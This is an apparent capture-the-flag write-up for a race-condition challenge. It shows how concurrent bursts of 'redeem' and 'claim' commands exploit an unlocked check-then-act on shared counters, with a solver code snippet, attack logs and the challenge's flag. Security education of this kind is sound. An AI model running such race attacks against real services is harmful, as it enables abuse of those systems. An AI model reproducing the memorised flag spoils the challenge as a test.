# tearing

**Event:** CryoVault CTF 2026
**Category:** pwn
**Flag:** `isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}`

---

`nc 0.cloud.chals.io 26166`

## §0 Paste-ready handoff

- **Status: SOLVED.** Flag recovered and reproduced twice (see `solve.log`, `hammer.log`).
- **Category:** pwn/misc - TOCTOU race condition on shared server state.
- **Target:** `0.cloud.chals.io 26166`, line-based text protocol.
- **Flag:** `isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}`
- **One-line repro:** `python3 solve.py` (64 threads, 120 s budget; hits in well
  under a minute - reproduced 3/3 consecutive fresh runs).
- **Root cause:** the vault's `(prizes, tickets)` counters are **global (shared by
  every connection)** and `claim` does an un-locked check-then-act
  (`if prizes >= 15:` … then update). Concurrent `claim`s all read the same
  `prizes >= 15` snapshot and every one of them takes the success branch.
- **Do not re-derive (negatives):**
  1. Command matching is a **prefix** test (`redeem:1`, `status()`, `redeem\t1`
     all dispatch; `REDEEM`/` Redeem`/leading-space do **not**). There is no
     argument parsing - `redeem 15`, `claim:15` send no count. **No hidden
     commands exist** (119-word sweep: only prefix-matches, everything else → `?`).
  2. **No injection surface.** `%s%n`, `'`, `"`, `{}`, NUL bytes, 5000-byte
     lines, ANSI escapes, `\r` all return a plain `?` - no traceback, no eval.
  3. **State is NOT per-connection.** Fresh connections observe whatever the
     global state currently is (e.g. `prizes=4 tickets=-3`), so single-threaded
     probing appears "stuck at `1/0`" and looks like a dead end. It is not.
  4. `prizes + tickets == 1` is **invariant** - `redeem` transfers a ticket into
     a prize, `claim` transfers 15 prizes into a ticket. Reaching `prizes >= 15`
     requires `tickets == -14`, which is only reachable because `redeem` also
     mutates under the same un-locked window. Single-threaded you can never
     escape `prizes = 1`, so **serial play is provably useless** - do not grind it.
  5. Idle state drifts every ~40 - 80 s even with no commands from you; that is
     the shared instance being touched by other traffic/timers. It is a red
     herring, not the exploit.
- **Ranked leads (all resolved):** concurrency (win) > protocol fuzzing
  (empty) > hidden-command brute (empty).

## §1 Challenge text

> tearing - 50 pts - NotKnox - 3 solves
> *One ticket in the drawer. Leave with two.*
> `nc 0.cloud.chals.io 26166`

## §2 Service protocol

```
vault. commands: redeem | status | claim | quit
> status
prizes=1 tickets=0 need=15
> redeem
no tickets left
> claim
not enough prizes
> quit
```

| command | guard | success | failure |
|---|---|---|---|
| `status` | - | `prizes=P tickets=T need=15` | - |
| `redeem` | `tickets > 0` | `redeemed. prizes=P tickets=T` | `no tickets left` |
| `claim`  | `prizes >= 15` | prints the **flag** | `not enough prizes` |
| `quit`   | - | closes the connection | - |

Dispatch is `line.startswith(cmd)`; unknown input → `?`.

## §3 Root cause - TOCTOU on the global drawer

The service shares one mutable `(prizes, tickets)` pair across all clients and
checks the guard **separately from** the update, with no locking:

```python
# reconstructed
def claim():
    if prizes >= 15:          # <-- check
        ...                   # <-- (no lock / no re-read)
        tickets += 1          # <-- act, on a stale snapshot
        print(FLAG)
```

Because the check and the act are not atomic, a burst of concurrent `claim`s
all observe `prizes >= 15`, all enter the branch, and all receive the flag -
"one ticket in the drawer, leave with two". Under load the shared counters were
repeatedly observed at `prizes=17 tickets=-16`, i.e. the `tickets > 0` guard on
`redeem` tears open the same way and lets `prizes` climb past 15.

The invariant `prizes + tickets == 1` holds at rest; the race breaks the read
consistency, not the arithmetic.

## §4 Exploit

```bash
python3 solve.py                 # 64 threads, 120 s budget (hits in <60 s)
python3 solve.py <host> <port> [seconds]   # custom target / budget
```

Worker loop (see `solve.py`) - randomised command bursts, one recv per burst:

```python
s.sendall(random.choice(BURSTS))     # b"redeem\n"*8, b"claim\n"*4,
                                     # b"redeem\nclaim\n"*8, ...
buf = recv_until_prompt(s)
if b"isfcr{" in buf: win()
```

* `redeem` bursts drive the shared `prizes` counter up through the torn guard.
* `claim` bursts land inside the window the instant `prizes` crosses 15.
* First `isfcr{...}` seen wins; all threads stop.

Observed in one 40 s / 24-thread run (`hammer.log`):

```
    2452  b'no tickets left'
    1393  b'isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}'
     683  b'prizes=17 tickets=-16 need=15'
     259  b'not enough prizes'
     140  b'prizes=4 tickets=-3 need=15'
       4  b'prizes=0 tickets=1 need=15'
```

The flag was returned **1393 times** - every racer that entered the window got
it, exactly as the TOCTOU model predicts. `solve.py` independently produced the
same flag (`solve.log`).

## §5 Flag

```
isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}
```

## §6 Files

| file | role |
|---|---|
| `solve.py` | final solver (64 threads, randomised bursts), flag regex + early stop |
| `hammer.py` | first concurrency fuzzer to win; prints the response histogram |
| `probe.py` | protocol recon (command semantics) |
| `monitor.py` | idle-state drift observer |
| `solve.log`, `hammer.log` | captured runs proving the flag |

## §7 Reproduce from scratch

```bash
git clone tearing.bundle tearing && cd tearing
python3 solve.py            # needs network access to 0.cloud.chals.io:26166
```

